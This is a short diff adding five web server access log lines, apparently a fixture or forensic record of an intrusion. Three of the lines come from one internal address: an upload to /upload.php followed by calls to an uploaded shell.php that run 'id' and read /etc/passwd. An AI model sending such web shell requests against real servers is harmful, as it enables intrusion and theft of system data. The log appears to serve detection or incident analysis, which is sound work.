@@ -1,0 +1,5 @@
+10.200.0.5 - - [20/Nov/2026:09:12:01 +0000] "GET / HTTP/1.1" 200 10918 "-" "Mozilla/5.0"
+10.200.0.5 - - [20/Nov/2026:09:12:44 +0000] "POST /upload.php HTTP/1.1" 200 312 "-" "curl/8.5.0"
+10.200.0.5 - - [20/Nov/2026:09:13:02 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 54 "-" "curl/8.5.0"
+10.200.0.5 - - [20/Nov/2026:09:13:20 +0000] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1789 "-" "curl/8.5.0"
+10.200.0.7 - - [20/Nov/2026:09:20:11 +0000] "GET /index.html HTTP/1.1" 200 10918 "-" "Mozilla/5.0"
